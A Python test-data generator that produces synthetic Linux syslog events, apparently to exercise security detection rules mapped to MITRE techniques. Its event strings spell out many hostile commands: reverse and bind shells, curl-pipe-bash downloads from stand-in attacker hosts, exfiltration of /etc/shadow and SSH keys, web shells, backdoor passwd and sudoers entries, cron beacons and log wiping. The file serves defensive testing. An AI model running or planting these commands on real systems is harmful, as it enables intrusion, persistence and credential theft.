"""Auto-extracted from generate_test_logs.py — Linux syslog synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def linux_event(process, message, host=None, facility="auth", offset=0):
    """Generate a Linux syslog event in JSON format."""
    if host is None:
        host = random.choice(LINUX_HOSTS)
    return {
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": "info",
        "msg": message,
    }


def generate_linux_events():
    """Generate Linux events covering all 33 Linux rules."""
    events = []

    # SSH Failed Login
    attacker_ip = random.choice(SUSPICIOUS_IPS)
    for i in range(10):
        events.append(linux_event("sshd",
            f"Failed password for {random.choice(LINUX_USERS)} from {attacker_ip} port {random.randint(40000,65535)} ssh2",
            offset=i))

    # Sudo usage
    for i in range(5):
        user = random.choice(["admin", "deploy", "www-data"])
        events.append(linux_event("sudo",
            f"{user} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            offset=20+i, facility="auth"))

    # Reverse shell patterns
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "ncat -e /bin/bash 89.34.111.113 443",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_event("bash", shell, offset=30+i, facility="syslog"))

    # Crontab modification
    for i in range(3):
        events.append(linux_event("crontab",
            f"({random.choice(LINUX_USERS)}) REPLACE (root) crontab",
            offset=40+i, facility="cron"))

    # SSH authorized_keys modified
    for i in range(3):
        user = random.choice(LINUX_USERS)
        events.append(linux_event("bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{user}/.ssh/authorized_keys",
            offset=50+i, facility="syslog"))

    # History file cleared
    history_cmds = [
        "history -c",
        "rm -f ~/.bash_history",
        "unset HISTFILE",
        "export HISTSIZE=0",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_event("bash", cmd, offset=60+i, facility="syslog"))

    # Suspicious binaries (GTFOBins)
    suspicious_bins = {
        "base64": "base64 -d /tmp/encoded_payload",
        "chmod": "chmod 4755 /tmp/exploit",
        "chown": "chown root:root /tmp/backdoor",
        "curl": "curl -o /tmp/payload http://evil.com/malware",
        "dd": "dd if=/dev/sda of=/tmp/disk.img bs=4M",
        "gdb": "gdb -p 1234 -ex 'call system(\"/bin/sh\")'",
        "id": "id",
        "insmod": "insmod /tmp/rootkit.ko",
        "lua": "lua -e 'os.execute(\"/bin/sh\")'",
        "modprobe": "modprobe evil_module",
        "nc": "nc -lvp 4444 -e /bin/sh",
        "ncat": "ncat -lvp 4444 -e /bin/sh",
        "netcat": "netcat -e /bin/sh 10.0.0.1 4444",
        "nmap": "nmap -sV -p 1-65535 10.0.0.0/24",
        "passwd": "passwd --stdin deploy",
        "perl": "perl -e 'exec \"/bin/sh\"'",
        "python": "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
        "rmmod": "rmmod evil_module",
        "ruby": "ruby -e 'exec \"/bin/sh\"'",
        "shadow": "cat /etc/shadow",
        "socat": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
        "strace": "strace -p 1 -e trace=open",
        "tcpdump": "tcpdump -i eth0 -w /tmp/capture.pcap",
        "tshark": "tshark -i eth0 -w /tmp/capture.pcap",
        "wget": "wget http://evil.com/malware -O /tmp/payload",
        "whoami": "whoami",
        "wireshark": "wireshark -i eth0 -k",
    }
    for i, (binary, cmd) in enumerate(suspicious_bins.items()):
        for j in range(2):
            events.append(linux_event(binary, cmd,
                offset=100+i*3+j, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Container Escape Attempts ──
    container_escapes = [
        "nsenter -t 1 -m -u -i -n -p -- /bin/bash",
        "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
        "mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release",
        "echo '/path/to/payload' > /proc/sys/kernel/core_pattern",
    ]
    for i, cmd in enumerate(container_escapes):
        events.append(linux_event("bash", cmd, host="k8s-worker-03",
            offset=200+i, facility="syslog"))

    # ── LD_PRELOAD Hijacking ──
    ld_preload_cmds = [
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
        "echo '/tmp/rootkit.so' >> /etc/ld.so.preload",
        "sed -i '1i /tmp/evil.so' /etc/ld.so.preload",
    ]
    for i, cmd in enumerate(ld_preload_cmds):
        events.append(linux_event("bash", cmd, offset=210+i, facility="syslog"))

    # ── Kernel Module from Temp Directory ──
    kernel_module_cmds = [
        "insmod /tmp/rootkit.ko",
        "insmod /dev/shm/hidden_module.ko",
        "insmod /var/tmp/persistence.ko",
    ]
    for i, cmd in enumerate(kernel_module_cmds):
        events.append(linux_event("insmod", cmd, offset=220+i, facility="syslog"))

    # ── Password File Direct Modification ──
    passwd_cmds = [
        "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "tee -a /etc/passwd <<< 'eviluser:x:0:0::/root:/bin/bash'",
        "sed -i 's/root:x/root::/g' /etc/shadow",
        "echo 'backdoor::0:0::/:/bin/sh' > /etc/passwd",
    ]
    for i, cmd in enumerate(passwd_cmds):
        events.append(linux_event("bash", cmd, offset=230+i, facility="syslog"))

    # ── Process Injection via Ptrace ──
    ptrace_cmds = [
        "strace -p 1234 -o /tmp/trace.log",
        "gdb -p 5678 -batch -ex 'call system(\"/bin/sh\")'",
        "gdb --pid 9012 -batch -ex 'print (int)ptrace(PTRACE_ATTACH,1234,0,0)'",
    ]
    for i, cmd in enumerate(ptrace_cmds):
        events.append(linux_event("bash", cmd, offset=240+i, facility="syslog"))

    # ── Suspicious Network Traffic Redirect ──
    redirect_cmds = [
        "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443",
        "iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080",
        "iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT",
        "nft add rule ip nat prerouting tcp dport 443 dnat to 10.0.0.2:8443",
    ]
    for i, cmd in enumerate(redirect_cmds):
        events.append(linux_event("bash", cmd, offset=250+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Systemd Service Persistence ──
    systemd_cmds = [
        "systemctl enable /etc/systemd/system/evil-backdoor.service",
        "systemctl daemon-reload && systemctl start evil-backdoor.service",
        "cp /tmp/evil.service /etc/systemd/system/persistence.service && systemctl enable persistence.service",
    ]
    for i, cmd in enumerate(systemd_cmds):
        events.append(linux_event("bash", cmd, offset=300+i, facility="syslog"))

    # ── SSH Tunneling ──
    ssh_tunnel_cmds = [
        "ssh -L 8080:internal-db:3306 admin@bastion-01",
        "ssh -R 9090:localhost:22 attacker@evil.com",
        "ssh -D 1080 -N -f admin@jump-host",
        "autossh -M 0 -N -f -L 3389:dc01:3389 compromised@pivot",
    ]
    for i, cmd in enumerate(ssh_tunnel_cmds):
        events.append(linux_event("ssh", cmd, offset=310+i, facility="auth"))

    # ── Suspicious Download to /tmp ──
    download_cmds = [
        ("wget", "wget http://evil.com/backdoor.elf -O /tmp/updater"),
        ("curl", "curl -o /tmp/payload http://185.220.101.1/shell.sh"),
        ("wget", "wget -q http://c2.attacker.org/stage2 -O /tmp/s2"),
        ("curl", "curl http://evil.com/miner -o /tmp/xmrig"),
    ]
    for i, (proc, cmd) in enumerate(download_cmds):
        events.append(linux_event(proc, cmd, offset=320+i, facility="syslog"))

    # ── Process Execution from /dev/shm ──
    devshm_cmds = [
        "/dev/shm/reverse_shell",
        "chmod +x /dev/shm/miner && /dev/shm/miner",
        "bash /dev/shm/payload.sh",
    ]
    for i, cmd in enumerate(devshm_cmds):
        events.append(linux_event("bash", cmd, offset=330+i, facility="syslog"))

    # ── Sudoers Modification ──
    sudoers_cmds = [
        "visudo -f /etc/sudoers.d/backdoor",
        "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "cp /tmp/evil-sudoers /etc/sudoers.d/admin-override",
    ]
    for i, cmd in enumerate(sudoers_cmds):
        events.append(linux_event("bash", cmd, offset=340+i, facility="syslog"))

    # ── Shell Profile Persistence ──
    profile_cmds = [
        "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc",
        "echo '/tmp/backdoor &' >> /etc/profile.d/startup.sh",
        "echo 'nohup /tmp/miner &' >> ~/.bash_profile",
        "echo 'export PATH=/tmp/evil:$PATH' >> /etc/bash.bashrc",
    ]
    for i, cmd in enumerate(profile_cmds):
        events.append(linux_event("bash", cmd, offset=350+i, facility="syslog"))

    # ── At Job Scheduled ──
    at_cmds = [
        "at -f /tmp/payload.sh now + 5 minutes",
        "echo '/tmp/backdoor' | at midnight",
    ]
    for i, cmd in enumerate(at_cmds):
        events.append(linux_event("at", cmd, offset=360+i, facility="cron"))
    events.append(linux_event("batch", "batch < /tmp/commands.sh",
        offset=362, facility="cron"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Linux Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── DNS Tunneling ──
    dns_tunnel_cmds = [
        "iodine -f 10.0.0.1 tunnel.evil.com",
        "dns2tcp -z evil.com -r ssh -l 127.0.0.1 -p 2222",
        "dnscat --dns server=attacker.com --secret=s3cr3t",
    ]
    for i, cmd in enumerate(dns_tunnel_cmds):
        events.append(linux_event("bash", cmd, offset=400+i, facility="syslog"))

    # ── Hosts File Modification ──
    hosts_cmds = [
        "echo '10.0.0.1 updates.microsoft.com' >> /etc/hosts",
        "sed -i 's/nameserver .*/nameserver 185.220.101.1/' /etc/resolv.conf",
    ]
    for i, cmd in enumerate(hosts_cmds):
        events.append(linux_event("bash", cmd, offset=410+i, facility="syslog"))

    # ── Process Memory Access via /proc ──
    proc_cmds = [
        "cat /proc/self/environ | tr '\\0' '\\n' | grep PASSWORD",
        "cat /proc/1234/maps",
        "dd if=/proc/5678/mem of=/tmp/memdump bs=1 skip=4096 count=65536",
        "cat /proc/self/maps | grep heap",
    ]
    for i, cmd in enumerate(proc_cmds):
        events.append(linux_event("bash", cmd, offset=420+i, facility="syslog"))

    # ── Web Shell Creation ──
    webshell_cmds = [
        "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/cmd.php",
        "cp /tmp/shell.jsp /var/www/cgi-bin/upload.jsp",
        "curl -o /usr/share/nginx/html/backdoor.php http://evil.com/shell.php",
    ]
    for i, cmd in enumerate(webshell_cmds):
        events.append(linux_event("bash", cmd, offset=430+i, facility="syslog"))

    # ── Cryptominer Activity ──
    miner_cmds = [
        "./xmrig --url stratum+tcp://pool.minexmr.com:4444 --user wallet123 --donate-level 1",
        "cpuminer -a cryptonight -o stratum+ssl://xmr.pool.com:443",
        "/tmp/.hidden/minerd -a scrypt -o stratum+tcp://ltc.pool.com:3333",
    ]
    for i, cmd in enumerate(miner_cmds):
        events.append(linux_event("bash", cmd, offset=440+i, facility="syslog"))

    # ── Log File Tampering ──
    log_tamper_cmds = [
        "rm -f /var/log/auth.log",
        "truncate -s 0 /var/log/syslog",
        "cat /dev/null > /var/log/wtmp",
        "shred /var/log/secure",
        "journalctl --vacuum-time=1s",
    ]
    for i, cmd in enumerate(log_tamper_cmds):
        events.append(linux_event("bash", cmd, offset=450+i, facility="syslog"))

    # ── Post-Exploitation Enumeration Scripts ──
    enum_cmds = [
        "curl -L http://evil.com/linpeas.sh | bash",
        "wget http://evil.com/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh",
        "./linux-exploit-suggester.sh",
        "./pspy64 -f",
    ]
    for i, cmd in enumerate(enum_cmds):
        events.append(linux_event("bash", cmd, offset=460+i, facility="syslog"))

    # ── Bind Shell Listener ──
    bind_cmds = [
        "nc -lvp 4444",
        "ncat -lvp 8080 -e /bin/bash",
        "ncat -lp 443 --ssl -e /bin/sh",
        "socat TCP-LISTEN:9090,reuseaddr,fork EXEC:/bin/sh,pty,stderr",
    ]
    for i, cmd in enumerate(bind_cmds):
        events.append(linux_event("bash", cmd, offset=470+i, facility="syslog"))

    # ── Suspicious Cron Job Content ──
    cron_cmds = [
        "echo '*/5 * * * * curl http://evil.com/update|sh' >> /etc/cron.d/update",
        "echo '0 * * * * wget http://c2.attacker.org/payload|bash' > /var/spool/cron/root",
        "echo '*/10 * * * * echo YmFzaCAtaQ== | base64 -d | bash' >> /etc/cron.d/hidden",
    ]
    for i, cmd in enumerate(cron_cmds):
        events.append(linux_event("bash", cmd, offset=480+i, facility="syslog"))

    # ── Hidden File Creation in Suspicious Locations ──
    hidden_cmds = [
        "mkdir /tmp/.X11-unix-bak && cp /tmp/payload /tmp/.X11-unix-bak/",
        "cp /tmp/miner /dev/shm/.hidden_miner",
        "echo '#!/bin/bash' > /var/tmp/.update.sh",
        "mkdir -p /run/lock/.cache && mv /tmp/rootkit /run/lock/.cache/",
    ]
    for i, cmd in enumerate(hidden_cmds):
        events.append(linux_event("bash", cmd, offset=490+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Linux Events
    # ═══════════════════════════════════════════════════════════════

    # ── Network Service Scanning (T1046) ──
    scan_cmds = [
        ("nmap", "nmap -sV -p 1-1024 192.168.1.0/24"),
        ("nmap", "nmap -sS -p 22,80,443,3306,5432 10.0.0.0/24"),
        ("masscan", "masscan -p 1-65535 --rate 1000 192.168.0.0/16"),
        ("zmap", "zmap -p 443 -B 10M -o results.csv"),
    ]
    for i, (proc, cmd) in enumerate(scan_cmds):
        events.append(linux_event(proc, cmd, offset=550+i, facility="syslog"))

    # ── System Owner/User Discovery (T1033) ──
    discovery_cmds = [
        "w ",
        "who -a",
        "last -a",
        "lastlog",
        "getent passwd",
        "cat /etc/group",
    ]
    for i, cmd in enumerate(discovery_cmds):
        events.append(linux_event("bash", cmd, offset=560+i, facility="syslog"))

    # ── External Remote Service Abuse (T1133) ──
    events.append(linux_event("sshd",
        "Accepted password for admin from 45.33.32.156 port 52345 ssh2",
        offset=570, facility="auth"))
    events.append(linux_event("bash",
        "openvpn --config /tmp/attacker.ovpn",
        offset=571, facility="syslog"))
    events.append(linux_event("bash",
        "xfreerdp /v:internal-dc.corp.local /u:admin /p:P@ssw0rd",
        offset=572, facility="syslog"))

    # ── Exfiltration Over Alternative Protocol (T1048) ──
    exfil_cmds = [
        "cat /etc/shadow | nc 185.220.101.1 9999",
        "tar czf - /home/ | ncat 45.33.32.156 8080",
        "scp -r /etc/ attacker@185.220.101.1:/loot/",
        "cat /root/.ssh/id_rsa | curl -X POST http://evil.com/collect -d @-",
    ]
    for i, cmd in enumerate(exfil_cmds):
        events.append(linux_event("bash", cmd, offset=580+i, facility="syslog"))

    # ── Archive Collected Data (T1560.001) ──
    archive_cmds = [
        "tar -czf /tmp/loot.tar.gz /etc/passwd /etc/shadow /root/.ssh/",
        "zip -r /dev/shm/data.zip /home/ /var/www/html/",
        "tar czf /var/tmp/backup.tar.gz /opt/application/config/",
    ]
    for i, cmd in enumerate(archive_cmds):
        events.append(linux_event("bash", cmd, offset=590+i, facility="syslog"))

    # ── Sensitive Data Access (T1005) ──
    data_access_cmds = [
        "cat /root/.ssh/id_rsa",
        "cat /home/admin/.oci/config",
        "cat /home/deploy/.aws/credentials",
        "cat /var/www/html/.env",
        "cat /opt/app/database.yml",
    ]
    for i, cmd in enumerate(data_access_cmds):
        events.append(linux_event("bash", cmd, offset=600+i, facility="syslog"))

    # ── Proxy/Tunneling Tools (T1090) ──
    proxy_cmds = [
        "chisel client 185.220.101.1:8080 R:socks",
        "chisel server --port 8080 --reverse",
        "frpc -c /tmp/frpc.ini",
        "proxychains4 ssh admin@internal-host",
    ]
    for i, cmd in enumerate(proxy_cmds):
        events.append(linux_event("bash", cmd, offset=610+i, facility="syslog"))

    # ── Encrypted Channel C2 (T1573) ──
    encrypted_cmds = [
        "openssl s_client -connect c2.evil.com:443",
        "ncat --ssl -e /bin/sh 185.220.101.1 443",
        "socat openssl-connect:evil.com:443,cert=/tmp/cert.pem EXEC:/bin/bash",
        "ssh -fNR 9090:localhost:22 attacker@evil.com",
    ]
    for i, cmd in enumerate(encrypted_cmds):
        events.append(linux_event("bash", cmd, offset=620+i, facility="syslog"))

    # ── Setuid Binary Creation (T1548.001) ──
    suid_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /tmp/backdoor",
        "chmod 4755 /tmp/root_shell",
        "chmod 6755 /var/tmp/persistence",
    ]
    for i, cmd in enumerate(suid_cmds):
        events.append(linux_event("bash", cmd, offset=630+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── SSH Brute Force: 15 failures from one IP to trigger frequency threshold ──
    attacker_brute_ip = "91.92.109.18"
    for i in range(15):
        events.append(linux_event("sshd",
            f"Failed password for root from {attacker_brute_ip} port {40000+i} ssh2",
            host="web-prod-01", offset=500+i))

    # ── Multi-Stage Attack on Single Host (same host: recon → access → persist) ──
    target_host = "app-prod-02"
    # Stage 1: Initial access (SSH brute force)
    for i in range(5):
        events.append(linux_event("sshd",
            f"Failed password for admin from 185.220.101.1 port {50000+i} ssh2",
            host=target_host, offset=520+i))
    # Stage 2: Successful login followed by downloads
    events.append(linux_event("sshd",
        "Accepted password for admin from 185.220.101.1 port 50005 ssh2",
        host=target_host, offset=526))
    events.append(linux_event("bash",
        "curl -o /tmp/payload http://evil.com/stage2.sh",
        host=target_host, offset=527, facility="syslog"))
    events.append(linux_event("bash",
        "wget http://c2.attacker.org/persist -O /tmp/persist.sh",
        host=target_host, offset=528, facility="syslog"))
    # Stage 3: Persistence
    events.append(linux_event("bash",
        "echo 'ssh-rsa AAAA... attacker@evil' >> /home/admin/.ssh/authorized_keys",
        host=target_host, offset=529, facility="syslog"))
    events.append(linux_event("bash",
        "echo '*/5 * * * * curl http://evil.com/beacon|sh' >> /etc/cron.d/update",
        host=target_host, offset=530, facility="syslog"))
    events.append(linux_event("bash",
        "systemctl enable /etc/systemd/system/backdoor.service",
        host=target_host, offset=531, facility="syslog"))
    # Stage 4: Credential access
    events.append(linux_event("bash",
        "cat /etc/shadow",
        host=target_host, offset=532, facility="syslog"))
    events.append(linux_event("bash",
        "cat /etc/passwd",
        host=target_host, offset=533, facility="syslog"))

    # ── Persistence Score: Multiple persistence mechanisms on one host ──
    persist_host = "bastion-01"
    persist_cmds = [
        ("bash", "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc"),
        ("crontab", "(admin) REPLACE (root) crontab"),
        ("bash", "systemctl enable /etc/systemd/system/evil-backdoor.service"),
        ("bash", "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"),
        ("bash", "echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
        ("at", "at -f /tmp/payload.sh now + 5 minutes"),
    ]
    for i, (proc, cmd) in enumerate(persist_cmds):
        events.append(linux_event(proc, cmd, host=persist_host,
            offset=540+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  Scenario expansion: hunting coverage for oci-coordinator demos
    # ═══════════════════════════════════════════════════════════════

    # ── Boopkit / eBPF Rootkit Activity (T1014, T1059.004, T1095) ──
    boopkit_host = "k8s-worker-03"
    boopkit_cmds = [
        ("wget", "wget https://github.com/krisnova/boopkit/releases/download/v0.0.5/boopkit -O /tmp/boopkit"),
        ("bash", "chmod +x /tmp/boopkit && /tmp/boopkit -i eth0 -p 4444"),
        ("boopkit", "boopkit attaching eBPF program XDP_REDIRECT to interface eth0"),
        ("bpftool", "bpftool prog load /tmp/boopkit.bpf.o /sys/fs/bpf/boopkit"),
        ("bpftool", "bpftool map create /sys/fs/bpf/boopkit_map type hash key 8 value 64 entries 1024"),
        ("bash", "ls /sys/fs/bpf/ -la"),
        ("bash", "cat /sys/kernel/debug/tracing/trace_pipe | grep boopkit"),
        ("bpftool", "bpftool prog show pinned /sys/fs/bpf/boopkit type xdp"),
        ("boopkit", "boopkit triggered: magic packet from 185.220.101.1 invoked reverse shell to 198.51.100.77:4444"),
        ("bash", "/tmp/boopkit --listen 0.0.0.0 --bpf-path /sys/fs/bpf/boopkit --magic deadbeef"),
    ]
    for i, (proc, cmd) in enumerate(boopkit_cmds):
        events.append(linux_event(proc, cmd, host=boopkit_host,
            offset=620+i, facility="syslog"))

    # ── Web Server Process Spawning Shell (auditd ppid= style, T1059/T1190) ──
    auditd_inject_host = "web-prod-01"
    auditd_msgs = [
        'type=SYSCALL msg=audit(1716200001.123:42): arch=c000003e syscall=59 success=yes ppid=python3 pid=21001 exe="/bin/bash" comm="bash" cmdline="bash -c id;whoami;cat /etc/passwd"',
        'type=EXECVE msg=audit(1716200012.456:43): argc=3 a0="/bin/sh" a1="-c" a2="curl http://185.220.101.1/cmd | bash" ppid=node pid=21044 exe="/bin/sh"',
        'type=SYSCALL msg=audit(1716200023.789:44): arch=c000003e syscall=59 success=yes ppid=java pid=21102 exe="/bin/bash" comm="bash" cmdline="bash -c \\"id && uname -a && cat /etc/shadow\\""',
        'type=EXECVE msg=audit(1716200034.012:45): argc=3 a0="/bin/sh" a1="-c" a2="$(curl -s http://evil.com/payload.sh)" ppid=php pid=21155 exe="/bin/sh"',
        'type=SYSCALL msg=audit(1716200045.234:46): ppid=nginx pid=21188 exe="/bin/bash" cmdline="bash -c \\"whoami; id; ls -la /etc/passwd\\""',
        'type=EXECVE msg=audit(1716200056.567:47): argc=3 a0="/bin/dash" a1="-c" a2="cat /etc/passwd | nc 45.33.32.156 9999" ppid=uvicorn pid=21199 exe="/bin/dash"',
        'type=SYSCALL msg=audit(1716200067.890:48): ppid=gunicorn pid=21220 exe="/usr/bin/bash" comm="bash" cmdline="bash -c \\"; whoami && id\\""',
        'type=EXECVE msg=audit(1716200078.111:49): argc=3 a0="/bin/bash" a1="-c" a2="`cat /etc/passwd`" ppid=httpd pid=21250 exe="/bin/bash"',
        'type=SYSCALL msg=audit(1716200089.333:50): ppid=ruby pid=21270 exe="/bin/sh" cmdline="sh -c \\"id; cat /etc/shadow\\""',
    ]
    for i, m in enumerate(auditd_msgs):
        events.append(linux_event("auditd", m, host=auditd_inject_host,
            offset=640+i, facility="syslog"))

    # ── SSRF to Cloud Instance Metadata Service from Web Process (T1552.005, T1190) ──
    ssrf_host = "app-prod-02"
    ssrf_cmds = [
        ("python3", "python3 -c \"import requests; print(requests.get('http://169.254.169.254/opc/v2/instance/').text)\""),
        ("curl", "curl -s http://169.254.169.254/opc/v2/instance/metadata/identity/cert.pem"),
        ("node", "node -e \"require('http').get('http://169.254.169.254/opc/v2/identity/', r=>r.pipe(process.stdout))\""),
        ("uvicorn", 'uvicorn worker: GET /api/fetch?url=http://169.254.169.254/opc/v2/instance/ HTTP/1.1 200'),
        ("wget", "wget -qO- http://169.254.169.254/opc/v2/instance/metadata/credentials/oci_user_principal_session"),
        ("java", "java -cp app.jar com.evil.MetadataDump http://169.254.169.254/opc/v2/instance/"),
        ("gunicorn", 'gunicorn[21389]: GET /api/proxy?u=http%3A%2F%2F169.254.169.254%2Fopc%2Fv2%2Finstance%2F HTTP/1.1 200'),
        ("php", "php -r \"echo file_get_contents('http://169.254.169.254/opc/v2/instance/');\""),
        ("ruby", "ruby -e \"require 'net/http'; puts Net::HTTP.get('169.254.169.254','/opc/v2/instance/')\""),
        ("httpd", 'httpd[21422]: GET /image-proxy?url=http://169.254.169.254/opc/v2/identity/cert.pem HTTP/1.1 200'),
        ("nginx", 'nginx: GET /api/v1/preview?src=http://169.254.169.254/opc/v2/instance/ HTTP/1.1 200'),
    ]
    for i, (proc, cmd) in enumerate(ssrf_cmds):
        events.append(linux_event(proc, cmd, host=ssrf_host,
            offset=660+i, facility="syslog"))

    return events
